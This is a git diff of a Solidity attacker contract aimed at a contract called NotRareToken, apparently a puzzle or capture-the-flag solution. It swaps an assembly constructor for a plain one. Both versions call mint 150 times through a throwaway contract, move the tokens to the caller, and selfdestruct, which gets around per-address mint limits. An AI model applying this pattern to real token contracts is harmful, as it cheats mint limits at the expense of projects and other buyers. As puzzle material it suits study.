@@ -17,26 +17,40 @@ contract NotRareToken is ERC721 {
     }
 }
 contract OptimizedAttacker {
-    constructor(uint victim,uint tokenOffset) payable{
-        assembly{
-            mstore(returndatasize(),hex"1249c58b")       
-            for {let i := 150}1{}{
-                i := sub(i, call(gas(),victim,returndatasize(),returndatasize(),4,returndatasize(),returndatasize()))
-                if iszero(i){
-                    break
-                }
+    // constructor(uint victim,uint tokenOffset) payable{
+    //     assembly{
+    //         mstore(returndatasize(),hex"1249c58b")       
+    //         for {let i := 150}1{}{
+    //             i := sub(i, call(gas(),victim,returndatasize(),returndatasize(),4,returndatasize(),returndatasize()))
+    //             if iszero(i){
+    //                 break
+    //             }
+    //         }
+    //         mstore(returndatasize(),hex"23b872dd")
+    //         mstore(4,address())
+    //         mstore(36,origin())
+    //         for {let i:=add(tokenOffset,149)}1{}{
+    //             mstore(68,i)
+    //             i := sub(i,call(gas(),victim,returndatasize(),returndatasize(),100,returndatasize(),returndatasize()))
+    //             if lt(i,tokenOffset){
+    //                 break
+    //             }
+    //         }
+    //         selfdestruct(origin())
+    //     }
+    // }
+
+    constructor(address victim, uint256 tokenOffset) payable {
+        unchecked {
+            uint i;
+            for (;i<150;++i) {
+                victim.call(hex"1249c58b");
             }
-            mstore(returndatasize(),hex"23b872dd")
-            mstore(4,address())
-            mstore(36,origin())
-            for {let i:=add(tokenOffset,149)}1{}{
-                mstore(68,i)
-                i := sub(i,call(gas(),victim,returndatasize(),returndatasize(),100,returndatasize(),returndatasize()))
-                if lt(i,tokenOffset){
-                    break
-                }
+            for (i = i + tokenOffset;i>tokenOffset;--i) {
+                NotRareToken(victim).transferFrom(address(this), msg.sender, i);
             }
-            selfdestruct(origin())
-        }
+            selfdestruct(payable(tx.origin));
+        }       
     }
 }
+
